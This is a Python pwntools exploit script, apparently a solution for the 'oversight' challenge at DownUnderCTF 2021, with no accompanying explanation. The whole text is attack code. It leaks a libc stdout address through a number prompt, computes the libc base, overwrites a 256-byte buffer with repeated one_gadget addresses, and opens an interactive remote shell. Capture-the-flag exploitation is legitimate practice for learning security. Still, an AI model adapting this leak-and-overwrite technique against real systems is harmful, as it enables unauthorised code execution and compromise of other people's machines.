from pwn import *
import sys

elf = ELF('oversight_patched')
libc = ELF('libc-2.27.so')
context.update(binary=elf)

host = 'pwn-2021.duc.tf'
port = 31909

p = remote(host, port)
# p = elf.process()

p.send(b'\n')
p.recvuntil(b'number: ')
p.sendline(b'17')
p.recvuntil(b'is: ')
leak = int(p.recvline()[:-1], 16)
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
log.info(f'Leak: {hex(leak)}')
log.info(f'Libc base: {hex(libc.address)}')

size = 256
p.recvuntil(b'(max 256)? ')
p.sendline(str(size).encode())

one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = libc.address + one_gadgets[0]
log.info(f'Address: {hex(one_gadget)}')

payload = p64(one_gadget) * (size // 8)
p.send(payload)

p.interactive()

p.close()
